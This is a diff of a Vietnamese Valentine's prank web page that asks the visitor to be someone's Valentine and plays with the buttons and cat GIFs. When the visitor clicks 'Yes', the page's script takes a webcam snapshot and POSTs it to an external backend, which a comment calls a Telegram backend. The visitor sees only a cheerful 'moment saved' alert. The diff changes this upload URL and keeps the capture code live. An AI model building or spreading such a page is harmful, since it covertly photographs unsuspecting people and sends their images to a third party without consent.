@@ -5,14 +5,14 @@
 <title>Cẩn thận bắt sáng cam 💖</title>
 <style>
 body {
-  margin:0;
-  padding:0;
-  height:100vh;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  font-family:Arial;
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  font-family: Arial;
   background-color: #f5c6cb; /* Nền hồng */
   overflow: hidden;
 }
@@ -58,7 +58,8 @@ h1 {
 <h1 id="title">Cậu có muốn Valentine cùng tớ không? 💌</h1>
 
 <div id="gifContainer">
-  <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif"> <!-- GIF mèo xanh dương đầu tiên -->
+  <!-- Dùng một GIF con mèo xanh dương duy nhất -->
+  <img id="mainGif" src="https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif">
 </div>
 
 <div id="buttonRow">
@@ -80,23 +81,16 @@ let hoverCount = 0;
 const maxHover = 6;
 let yesFontSize = 18;
 
-// GIF con mèo xanh dương thay đổi
-const catGifs = [
-  "https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif", // GIF 1
-  "https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif", // GIF 2
-  "https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif",     // GIF 3
-  "https://media.giphy.com/media/3o6ZsXnksv7rDZZZp2/giphy.gif", // GIF 4
-  "https://media.giphy.com/media/l0HlRmV47L7O1dKDy/giphy.gif",   // GIF 5
-  "https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif"  // GIF cuối
-];
+// GIF con mèo xanh dương thay đổi mỗi lần Từ chối
+const catGif = "https://media.giphy.com/media/3o6Zt481isNVuQI1l6/giphy.gif"; // GIF mèo xanh dương
 
-// Nút từ chối ấn mới bé lại + đổi chữ
-const noTexts = ["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔","Lần cuối đấy 😎"];
+// Chữ từ chối mỗi lần bấm
+const noTexts = ["Thật không? 😢", "Suy nghĩ lại đi 🥺", "Đừng mà 😭", "Bấm nhầm đúng không 😏", "Cho cơ hội đi 💔", "Lần cuối đấy 😎"];
 noBtn.addEventListener("click", () => {
   if (hoverCount >= maxHover) return;
 
   // Chuyển GIF mèo mỗi lần bấm
-  mainGif.src = catGifs[hoverCount % catGifs.length];
+  mainGif.src = catGif;
 
   // Tăng font-size Đồng ý
   yesFontSize += 5;
@@ -118,8 +112,8 @@ noBtn.addEventListener("click", () => {
     yesBtn.style.top = "0";
     yesBtn.style.left = "0";
 
-    // Thay đổi GIF thành con thỏ trắng hôn mèo
-    mainGif.src = "https://media.giphy.com/media/l3vR1sAVgZ7TxJ7bC/giphy.gif"; // GIF thỏ hôn mèo
+    // Thay đổi GIF sau khi bấm Đồng ý
+    mainGif.src = "https://media.giphy.com/media/l3vR1sAVgZ7TxJ7bC/giphy.gif"; // GIF mèo bị thỏ hôn
     title.innerText = "Yeahhh!! Tớ biết mà 💖💖💖";
   }
 });
@@ -148,11 +142,14 @@ yesBtn.addEventListener("click", async () => {
     setTimeout(async () => {
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imgData = canvas.toDataURL("image/png");
-      await fetch("https://duong-stack-valentine-telegram-back-alpha.vercel.app/upload", {
+
+      // Gửi ảnh lên backend Telegram
+      await fetch("https://valentine-backend.vercel.app/upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ image: imgData })
       });
+
       alert("Khoảnh khắc đã được lưu 💖");
       stream.getTracks().forEach(t => t.stop());
       video.remove();
